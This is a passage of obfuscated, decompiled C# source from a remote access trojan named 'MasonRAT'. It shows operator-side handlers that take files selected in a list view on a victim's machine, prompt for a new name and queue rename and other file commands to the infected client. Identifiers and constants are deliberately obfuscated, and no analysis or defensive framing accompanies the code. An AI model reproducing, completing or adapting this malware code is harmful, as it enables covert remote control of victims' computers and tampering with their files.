\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ;
    strArray1[(((-293612265 ^ ~732586249) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) > 2103564910 - 929578808 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 ? 140296196 - (144187763 << 1389089646) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 : (801771954 > 2124611053 ? 4 : 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray1[(25869 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 - (2035958582 - 1824124033 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 >> (1359469261 - (424282382 << 556655833) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
    Outcoming_Requests outcomingRequests1 = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray1)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests1);
    this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
    this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
  }

  private void \u2694️MasonRAT\u270Cڝ̍ۛ\u060Dـــمڙ̍څڙ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 360) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڙــ\u060B\u0608ڼ\u060D\u0608\u0608ـگـ\u060D\u060F\u060Aٺ\u060E\u0608(
    object sender,
    EventArgs e)
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 361) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u060C\u0608ۭڛء\u060Aـ\u060Dءۨ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        int imageIndex = selectedItem.ImageIndex;
        if (imageIndex < 0 || imageIndex > 1)
        {
          if (imageIndex == ((-833125551 - (977051822 | 448326095) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ -((2095274897 ^ 277232945 >> 121989984) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0))
          {
            string Left = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 362), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 363), selectedItem.Text, -751773672 - 242204188 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - -(1974920707 - (2061180220 << 117662097) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, (-1428451641 - 2126141529 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) - ((740374115 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0));
            if (Operators.CompareString(Left, selectedItem.Text, false) != 0)
            {
              string[] strArray = new string[((2024138068 > 1679893832 ? -1473281231 : -1964374974) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ -(1633085215 - (1278431938 >> 528168099) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)];
              strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 364);
              strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(966176940 - 1901506726 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + ((822179195 ^ (875018957 | 20430339)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 | -1752466218 - (1267146228 | 377119482) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 365);
              strArray[((958989760 ^ 541230756 % 426625896) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ ((738541279 ^ 1430029564 << 767049746) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 | 364199909 - (2023175595 >> 10885640) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(1022091274 + -794699421 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 > (1790168675 << 935522341) - 1416799241 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ? (19 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 : 439345373 % 1017843903 - 439345368 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
              strArray[(818603740 - 818603732 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ (21 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)] = selectedItem.Text;
              strArray[((397317337 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + ~(397351781 - (1129704512 >> 673553071) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(1458877898 - (269175220 << 360789811) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ ((1159318403 > 1117926125 ? 1150795109 : 1534393478) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) % (615206879 - -379041721 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = Left;
              Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
              Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
            }
          }
          else
          {
            string Left = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 366), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 367), selectedItem.Text, (-282892825 - ~336577026 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 > -2138753169 - (851665399 | 2113423461) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 ? 1331078591 + ~1331078591 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 : (714206180 >> 150738237) - 2 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), (-850245239 - 2119310145 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 > (-1733979299 ^ ~1557423509) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 ? (1907856343 > 1759121834 ? -1 : -1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 : (260157995 > 880002960 ? -1 : -1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1);
            if (Operators.CompareString(Left, selectedItem.Text, false) != 0)
            {
              string[] strArray = new string[(155838449 - 155838439 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 ^ 1054327932 - 1054327930 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)];
              strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 368);
              strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(1776016376 - 1888113013 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ -(1036190655 - (2094813753 << 46812262) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 369);
              strArray[((1987484998 > 438341197 ? -660092596 : -880123461) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) - ~((660092598 ^ 138371020 << 56359422) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(1030157456 - ~713852303 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + ~(-2131085778 - 419871763 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
              strArray[((114425097 ^ 1116894420 % 1002469316) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ ((-2140474248 ^ -2082358973) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) >> ((1654572158 ^ 340858891 % 519190882) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)] = selectedItem.Text;
              strArray[((2013279077 > 353287325 ? -1980370049 : 1654473898) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 ^ -((618415410 > 2087883189 ? -1654473890 : 1980370055) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
